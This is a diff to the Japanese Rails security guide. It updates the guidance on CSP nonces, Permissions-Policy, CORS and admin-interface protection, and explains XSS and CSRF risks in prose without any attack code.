-レガシーなコンテンツを移行するときにコンテンツの違反だけをレポートしたい場合は、設定で`content_security_policy_report_only`属性を用いて[Content-Security-Policy-Report-Only](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only)を設定します。
+レガシーなコンテンツを移行するときにコンテンツの違反だけをレポートしたい場合は、設定で`content_security_policy_report_only`属性を用いて[`Content-Security-Policy-Report-Only`][]を設定します。
 
 ```ruby
 # config/initializers/content_security_policy.rb
 Rails.application.config.content_security_policy_report_only = true
 ```
 
-以下のようにコントローラでオーバーライドすることもできます。
+以下のようにコントローラでオーバーライドすることも可能です。
 
 ```ruby
 class PostsController < ApplicationController
@@ -1094,9 +1158,12 @@ class PostsController < ApplicationController
 end
 ```
 
+[`Content-Security-Policy-Report-Only`]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only
+[`report-uri`]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri
+
 #### nonceを追加する
 
-`'unsafe-inline'`の利用を検討しているのであれば、、代わりにnonceの利用を検討してください。既存のコードの上にContent Security Policyを実装する場合、`'unsafe-inline'`に比べて[nonceは実質的な改善](https://www.w3.org/TR/CSP3/#security-nonces)を提供できます。
+`'unsafe-inline'`の利用を検討しているのであれば、代わりにnonceの利用を検討してください。既存のコードの上にContent Security Policyを実装する場合、`'unsafe-inline'`に比べて[nonceは実質的な改善](https://www.w3.org/TR/CSP3/#security-nonces)を提供できます。
 
 ```ruby
 # config/initializers/content_security_policy.rb
@@ -1107,7 +1174,25 @@ end
 Rails.application.config.content_security_policy_nonce_generator = -> request { SecureRandom.base64(16) }
 ```
 
-これで、以下のように`html_options`の中で`nonce: true`を渡せばnonce値が自動的に追加されます。
+nonceジェネレータを設定する場合は、いくつかの考慮すべきトレードオフがあります。
+`SecureRandom.base64(16)`を利用する場合、リクエストごとに新しいランダムなnonceを生成するので、デフォルト値としては有用です。
+しかしこの方法だと、新しいnonceがリクエストごとに新しいETag値を生成してしまうため、[条件付きGETキャッシュ](caching_with_rails.html#条件付きgetのサポート)と互換性がありません。
+リクエストごとのランダムなnonceの代替は、以下のようにセッションidを使うことです。
+
+```ruby
+Rails.application.config.content_security_policy_nonce_generator = -> request { request.session.id.to_s }
+```
+
+この生成方法はETagと互換性がありますが、その安全性は、セッションIDが十分にランダムであり、安全でないcookieに公開されないことに依存します。
+
+デフォルトでは、nonceジェネレータが定義されている場合、`script-src`と`style-src`にnonceが適用されます。
+`config.content_security_policy_nonce_directives`を使うと、以下のようにどのディレクティブでnonceを利用するかを変更できます。
+
+```ruby
+Rails.application.config.content_security_policy_nonce_directives = %w(script-src)
+```
+
+イニシャライザでnonceの生成を設定してから、`html_options`の一部として`nonce: true`を渡すことで、スクリプトタグに自動的にnonce値を追加できます。
 
 ```html+erb
 <%= javascript_tag nonce: true do -%>
@@ -1131,10 +1216,108 @@ Rails.application.config.content_security_policy_nonce_generator = -> request { 
 
 これは、動的に読み込まれるインライン`<script>`要素をRails UJSヘルパーが生成するのに使われます。
 
+### `Feature-Policy` Header
+
+NOTE: `Feature-Policy`ヘッダーは、`Permissions-Policy`に名称変更されました。
+`Permissions-Policy`は異なる実装を必要とし、まだすべてのブラウザでサポートされているわけではありません。将来的にこのミドルウェアの名前を変更する必要がないように、ミドルウェアには新しい名前を使いますが、古いヘッダー名と実装は今のところそのままにしています。
+
+ブラウザ機能の利用を許可またはブロックするために、アプリケーションの [`Feature-Policy`][]レスポンスヘッダーを定義できます。Railsには、ヘッダーを設定するためのDSLが用意されています。
+
+適切なイニシャライザで以下のようにポリシーを定義します。
+
+```ruby
+# config/initializers/permissions_policy.rb
+Rails.application.config.permissions_policy do |policy|
+  policy.camera      :none
+  policy.gyroscope   :none
+  policy.microphone  :none
+  policy.usb         :none
+  policy.fullscreen  :self
+  policy.payment     :self, "https://secure.example.com"
+end
+```
+
+グローバルに設定されたポリシーは、以下のようにリソース単位でオーバーライドできます。
+
+```ruby
+class PagesController < ApplicationController
+  permissions_policy do |policy|
+    policy.geolocation "https://example.com"
+  end
+end
+```
+
+[`Feature-Policy`]: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Permissions-Policy
+
+### Cross-Origin Resource Sharing（CORS）
+
+ブラウザは、スクリプトから開始されるクロスオリジンHTTPリクエストを制限しています。RailsをAPIとして動作させ、フロントエンドアプリを別ドメインで動作させたい場合、[Cross-Origin Resource Sharing](https://developer.mozilla.org/ja/docs/Web/HTTP/CORS) (CORS) を有効にする必要があります。
+
+CORSの処理には、[Rack CORS](https://github.com/cyu/rack-cors)ミドルウェアを利用できます。
+なお、`--api`オプションを指定してアプリケーションを生成した場合はRack CORSはおそらく既に設定済みなので、以下の手順は省略できます。
+
+最初に、rack-cors gemをGemfileに追加します。
+
+```ruby
+gem 'rack-cors'
+```
+
+次に、ミドルウェアの設定をイニシャライザに追加します。
+
+```ruby
+# config/initializers/cors.rb
+Rails.application.config.middleware.insert_before 0, "Rack::Cors" do
+  allow do
+    origins 'example.com'
+
+    resource '*',
+      headers: :any,
+      methods: [:get, :post, :put, :patch, :delete, :options, :head]
+  end
+end
+```
+
+イントラネットとAdminのセキュリティ
+---------------------------
+
+イントラネットや管理画面インターフェイスは特権アクセスが許可されているので、攻撃の目標にされがちです。イントラネットや管理画面インターフェイスにはセキュリティ対策の追加が必要なはずですが、現実には逆にセキュリティ対策が弱いことがしばしばあります。
+
+2007年、その名もMonster.comというオンラインリクルート用Webアプリケーションで、特殊なトロイの木馬プログラムによってイントラネットから情報が盗み出され、文字どおり経営者にとってのモンスターとなった事件がありました。標的を絞り込んだオーダーメイドのトロイの木馬は現時点では非常にまれなので、リスクは相当低いと言えますが、それでもゼロではありません。これは、クライアントホストのセキュリティも重要であるというよい例です。ただし、イントラネットや管理アプリケーションにとって最も脅威となるのは、XSSとCSRFです。
+
+### クロスサイトスクリプティング
+
+悪意のあるユーザーがイントラネットの外から入力したデータが、Webアプリケーションで再表示されると、WebアプリケーションがXSS攻撃に対して脆弱になります。ユーザー名、コメント、スパムレポート、注文フォームの住所のような情報がXSS攻撃に使われることも珍しくありません。
+
+管理画面やイントラネットで1箇所でもサニタイズ漏れがあれば、アプリケーション全体が脆弱になってしまいます。想定される攻撃としては、管理者のcookieの盗み出し、管理者パスワードを盗み出すためのiframe注入、管理者権限奪取のためにブラウザのセキュリティホールを経由して悪質なソフトウェアをインストールする、などが考えられます。
+
+XSS対策の注入に関するセクションも参照してください。
+
+### クロスサイトリクエストフォージェリ
+
+クロスサイトリクエストフォージェリ（Cross-Site Request Forgery）はクロスサイトリファレンスフォージェリ（XSRF: Cross-Site Reference Forgery）とも呼ばれ、非常に強力な攻撃手法です。この攻撃を受けると、管理者やイントラネットユーザーが実行可能な操作をすべて行えるようになってしまいます。CSRFについては既に説明しましたので、ここでは攻撃者がイントラネットや管理画面に対して攻撃を仕掛ける手順をいくつかの事例で説明します。
+
+現実に起きた事例として[CSRFによるルーター再構成](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352) を取り上げましょう。この攻撃者は、CSRFを仕込んだ危険なメールをメキシコの多数のユーザーに送信しました。このメールには、「お客様のeカードをご用意いたしました」と書かれており、imageタグが含まれていました。そしてそのタグには、ユーザーのルーターを再構成してしまうHTTP GETリクエストが仕込まれていました。このルーターは、メキシコで広く普及しているモデルでした。このリクエストによってDNS設定が変更され、メキシコで事業を行っているネットバンキングWebサイトの一部が、攻撃者のWebサイトにマッピングされてしまいました。このルーターを経由してこのネットバンキングサイトにアクセスすると、攻撃者が設置した偽のWebサイトが開き、認証情報が盗まれてしまいました。
+
+Google Adsenseのメールアドレスとパスワードが変更された事例もあります。標的ユーザーがGoogle AdsenseにログインしてGoogle広告キャンペーン用の管理画面を開くと、攻撃者が標的ユーザーの認証情報を改変可能になるというものでした。
+
+その他の有名な事例としては、危険なXSSを拡散するために一般のWebアプリケーションやブログ、掲示板が利用された事件があります。言うまでもなく、この攻撃を成功させるためには攻撃者がURL構造を知っている必要がありますが、RailsのURLは構造がかなりシンプルなので、オープンソースの管理画面を使えば構造を簡単に調べられます。攻撃者は、ありそうなIDとパスワードの組み合わせを総当りで試す危険な`Img`タグを送り込むだけで、数千件ものまぐれ当たりを獲得できる可能性があります。
+
+**管理画面やイントラネットへのCSRF攻撃への対策については、CSRF対策のセクションを参照してください**。
+
+### その他の予防策
+
+管理画面は、多くの場合次のような作りになっているものです。www.example.com/admin のようなURLに置かれ、Userモデルのadminフラグがセットされている場合に限り、ここにアクセスできます。ユーザー入力が管理画面のフィールドに再表示されると、管理者の権限で任意のデータを削除・追加・編集できてしまいます。これについて考察してみましょう。
+
+* **常に最悪の事態を想定する**ことは極めて重要です。「誰かが自分のcookieやユーザー情報を盗み出すことに成功したらどうなるか」。管理画面に**ロール（role）**を導入することで、攻撃者が行える操作の範囲を狭めることができます。あるいは、アプリケーションで公開される部分で使われるログイン情報から切り離された、管理画面用の特殊なログイン認証情報を使う方法や、**極めて重要な操作では別途特殊なパスワードを要求する**方法も考えられます。
+
+* 管理者は、世界中どこからでもそのWebアプリケーションにアクセスする必要性があるとは限りません。**送信元IPアドレスを一定の範囲に制限する**という方法を考えてみましょう。`request.remote_ip`メソッドを使えばユーザーのIPアドレスをチェックできます。この方法は攻撃に対する直接の防御にはなりませんが、攻撃を困難にするうえでは非常に有効です。ただし、プロキシを用いて送信元IPアドレスを偽る方法があることもお忘れなく。
+
+* **管理画面を特別なサブドメインに置く**方法 （`admin.application.com`など）。さらに管理アプリケーションを独立させて独自のユーザー管理を行えるようにします。このような構成にすることで、通常の`www.application.com`ドメインから管理者cookieを盗み出すことは不可能になります。ブラウザには同一オリジンポリシーがあるので、`www.application.com`に注入されたXSSスクリプトから`admin.application.com`のcookieを読み出すことも、その逆も不可能になります。
+
 利用環境のセキュリティ
 ----------------------
 
-アプリケーションのコードや実行環境をセキュアにする方法については、本ガイドの範疇を超えます。ただし、セキュリティ維持のため、`config/database.yml`などのデータベース接続設定ファイル、`credentials.yml`にアクセスするためのマスターキー、その他の暗号化されていない秘密情報の取り扱いには十分注意してください。これらのファイルや、その他重要な情報を含む可能性のあるファイルを、環境に合わせて複数のバージョンを使い分けることで、さらにアクセス制限をかけることも検討しましょう。
+アプリケーションのコードや実行環境をセキュアにする方法については、本ガイドの範疇を超えます。ただし、セキュリティ維持のため、`config/database.yml`などのデータベース接続設定ファイル、`credentials.yml`にアクセスするためのマスターキー、その他の暗号化されていない秘密情報の取り扱いには十分注意してください。これらのファイルや、その他重要な情報を含む可能性のあるファイルを、環境に合わせて複数のバージョンを使い分けることで、アクセス制限を強化することも検討しましょう。
 
 ### 独自のcredential
 
@@ -1177,6 +1360,5 @@ WARNING: マスターキーは安全な場所に保管してください。マ�
 動きの激しいセキュリティ動向に常に目を配り、常に最新の情報を入手しましょう。新しく登場した脆弱性を見逃すと、壊滅的な損害をこうむる可能性があります。Railsのセキュリティ関連の追加リソースをご紹介します。
 
 * Railsセキュリティ [メーリングリスト](https://discuss.rubyonrails.org/c/security-announcements/9)を購読しましょう。
-* [Brakeman - Rails Security Scanner](https://brakemanscanner.org/): Railsアプリケーションの静的セキュリティ解析を行うgemです。
 * [Mozilla's Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security.html): Content Security Policy、HTTPヘッダー、cookie、TLS接続などの推奨事項が掲載されています。
 * OWASPの[優れたセキュリティブログ](https://owasp.org)には[クロスサイトスクリプティングのチートシート](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md)が掲載されています。
